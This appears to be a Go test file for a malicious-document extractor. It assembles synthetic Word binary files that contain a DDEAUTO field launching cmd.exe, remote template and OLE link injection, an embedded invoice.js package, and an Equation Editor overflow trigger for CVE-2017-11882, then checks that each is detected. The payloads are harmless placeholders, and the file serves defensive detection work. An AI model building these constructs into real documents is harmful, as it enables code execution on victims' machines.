package extractor

import (
	"context"
	"encoding/binary"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/internal/cfbtest"
)

// wordDocFixture builds a Word 97-2003 FIB and table stream: main text and
// header text as one 8-bit piece, and an optional SttbfAssoc.
func wordDocFixture(mainText, headerText string, assoc []string) (wd, table []byte) {
	text := mainText + headerText
	wd = make([]byte, 0x600)
	binary.LittleEndian.PutUint16(wd, 0xA5EC)
	binary.LittleEndian.PutUint16(wd[0x0A:], 0x0200) // 1Table
	binary.LittleEndian.PutUint32(wd[0x4C:], uint32(len(mainText)))
	binary.LittleEndian.PutUint32(wd[0x54:], uint32(len(headerText))) // ccpHdd
	const textOff = 0x400
	wd = append(wd[:textOff], text...)
	table = make([]byte, 16)
	// Clx: Pcdt with one piece covering all text, 8-bit at textOff.
	plc := binary.LittleEndian.AppendUint32(nil, 0)
	plc = binary.LittleEndian.AppendUint32(plc, uint32(len(text)))
	pcd := make([]byte, 8)
	binary.LittleEndian.PutUint32(pcd[2:], uint32(textOff*2)|0x40000000)
	plc = append(plc, pcd...)
	clx := append([]byte{0x02}, binary.LittleEndian.AppendUint32(nil, uint32(len(plc)))...)
	clx = append(clx, plc...)
	binary.LittleEndian.PutUint32(wd[0x1A2:], uint32(len(table)))
	binary.LittleEndian.PutUint32(wd[0x1A6:], uint32(len(clx)))
	table = append(table, clx...)
	if assoc != nil {
		st := []byte{0xFF, 0xFF}
		st = binary.LittleEndian.AppendUint16(st, uint16(len(assoc)))
		st = binary.LittleEndian.AppendUint16(st, 0)
		for _, s := range assoc {
			st = append(st, xst(s)...)
		}
		binary.LittleEndian.PutUint32(wd[0x19A:], uint32(len(table)))
		binary.LittleEndian.PutUint32(wd[0x19E:], uint32(len(st)))
		table = append(table, st...)
	}
	return wd, table
}

func lpAnsi(s string) []byte {
	b := binary.LittleEndian.AppendUint32(nil, uint32(len(s)+1))
	return append(append(b, s...), 0)
}

// compObj builds a \x01CompObj stream with a user type and ProgID.
func compObj(userType, progID string) []byte {
	b := make([]byte, 28)
	b = append(b, lpAnsi(userType)...)
	b = binary.LittleEndian.AppendUint32(b, 0) // no clipboard format
	return append(b, lpAnsi(progID)...)
}

// oleStreamURL builds an \x01Ole stream for a linked object whose absolute
// moniker is a URL moniker.
func oleStreamURL(url string) []byte {
	u := append(utf16le(url), 0, 0)
	mk := append(append([]byte(nil), clsidURLMoniker...), binary.LittleEndian.AppendUint32(nil, uint32(len(u)))...)
	mk = append(mk, u...)
	b := binary.LittleEndian.AppendUint32(nil, 0x02000001)
	b = binary.LittleEndian.AppendUint32(b, 1) // linked
	b = binary.LittleEndian.AppendUint32(b, 0)
	b = binary.LittleEndian.AppendUint32(b, 0)
	b = binary.LittleEndian.AppendUint32(b, 0) // reserved moniker size
	b = binary.LittleEndian.AppendUint32(b, 0) // relative moniker size
	b = binary.LittleEndian.AppendUint32(b, uint32(len(mk)))
	return append(b, mk...)
}

// ole10Native builds an OLE1 Package stream.
func ole10Native(label, path string, data []byte) []byte {
	body := []byte{2, 0}
	body = append(append(body, label...), 0)
	body = append(append(body, path...), 0)
	body = append(body, 0, 0, 3, 0)
	body = append(body, lpAnsi(path)...)
	body = binary.LittleEndian.AppendUint32(body, uint32(len(data)))
	body = append(body, data...)
	return append(binary.LittleEndian.AppendUint32(nil, uint32(len(body))), body...)
}

// equationOverflow builds Equation Native data whose MTEF FONT record has
// an oversized name.
func equationOverflow() []byte {
	hdr := make([]byte, 28)
	binary.LittleEndian.PutUint16(hdr, 28)
	mtef := []byte{3, 1, 1, 3, 0, 0x08, 0x5A, 0x5A}
	mtef = append(mtef, []byte(strings.Repeat("A", 48))...)
	return append(append(hdr, mtef...), 0)
}

func findingKinds(res *Result) map[string][]ExternalRef {
	m := map[string][]ExternalRef{}
	for _, e := range res.External {
		m[e.Kind] = append(m[e.Kind], e)
	}
	return m
}

func TestWordBinaryFieldsTemplateObjectPool(t *testing.T) {
	main := "Invoice\r" + string(rune(0x13)) + " INCLUDEPICTURE \"http://example.invalid/p.png\" " + string(rune(0x15)) + "\r"
	hdr := string(rune(0x13)) + "DDEAUTO c:\\windows\\system32\\cmd.exe \"/k calc.exe\"" + string(rune(0x14)) + "x" + string(rune(0x15)) + "\r"
	wd, table := wordDocFixture(main, hdr, []string{"", `\\example.invalid\share\t.dotm`})
	data := cfbtest.Build(
		cfbtest.Stream{Name: "WordDocument", Data: wd},
		cfbtest.Stream{Name: "1Table", Data: table},
		cfbtest.Stream{Name: "ObjectPool/_1/\x01CompObj", Data: compObj("Microsoft Word Document", "Word.Document.8")},
		cfbtest.Stream{Name: "ObjectPool/_1/\x01Ole", Data: oleStreamURL("http://example.invalid/remote.rtf")},
		cfbtest.Stream{Name: "ObjectPool/_2/\x01Ole10Native", Data: ole10Native("invoice.js", `C:\Users\u\invoice.js`, []byte("WScript.Echo 1"))},
		cfbtest.Stream{Name: "ObjectPool/_3/Equation Native", Data: equationOverflow()},
	)
	res, err := Extract(context.Background(), data, nil)
	if err != nil {
		t.Fatal(err)
	}
	k := findingKinds(res)
	if d := k["dde"]; len(d) != 1 || !strings.Contains(d[0].Target, "cmd.exe") {
		t.Fatalf("DDE in header story not found: %+v", res.External)
	}
	if f := k["external_field"]; len(f) != 1 || f[0].Target != "http://example.invalid/p.png" {
		t.Fatalf("INCLUDEPICTURE not found: %+v", res.External)
	}
	if tpl := k["template_injection"]; len(tpl) != 1 || !strings.Contains(tpl[0].Target, "example.invalid") {
		t.Fatalf("attached template not found: %+v", res.External)
	}
	if l := k["external_ole"]; len(l) != 1 || l[0].Target != "http://example.invalid/remote.rtf" || l[0].Severity != "high" {
		t.Fatalf("linked object not found: %+v", res.External)
	}
	var pkg, eq bool
	for _, e := range k["embedded_ole"] {
		if strings.Contains(e.Detail, `"invoice.js"`) && e.Severity == "high" {
			pkg = true
		}
		if strings.HasPrefix(e.Location, "ObjectPool/_3") && strings.Contains(e.Detail, "CVE-2017-11882") {
			eq = true
		}
	}
	if !pkg || !eq || len(k["equation_editor_exploit"]) != 1 {
		t.Fatalf("package=%v equation=%v: %+v", pkg, eq, res.External)
	}
	if len(res.Checks) == 0 {
		t.Fatal("no checks recorded")
	}
}

// A local attached template (Normal.dotm) is not a finding.
func TestWordLocalTemplateIgnored(t *testing.T) {
	wd, table := wordDocFixture("Hello\r", "", []string{"", `C:\Users\u\AppData\Roaming\Microsoft\Templates\Normal.dotm`})
	data := cfbtest.Build(cfbtest.Stream{Name: "WordDocument", Data: wd}, cfbtest.Stream{Name: "1Table", Data: table})
	res, err := Extract(context.Background(), data, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(res.External) != 0 {
		t.Fatalf("unexpected findings: %+v", res.External)
	}
}

func TestParseOle10Native(t *testing.T) {
	p := parseOle10Native(ole10Native("a.hta", `C:\t\a.hta`, []byte("<script>")))
	if p == nil || p.Label != "a.hta" || p.Path != `C:\t\a.hta` || p.TempPath != `C:\t\a.hta` || string(p.Data) != "<script>" {
		t.Fatalf("%+v", p)
	}
}

func FuzzOLEStreams(f *testing.F) {
	f.Add(oleStreamURL("http://example.invalid/"))
	f.Add(compObj("Package", "Package"))
	f.Add(ole10Native("a", "b", []byte("c")))
	f.Fuzz(func(t *testing.T, b []byte) {
		parseOLEStream(b)
		parseCompObj(b)
		parseOle10Native(b)
		readSttb(b, 32)
	})
}
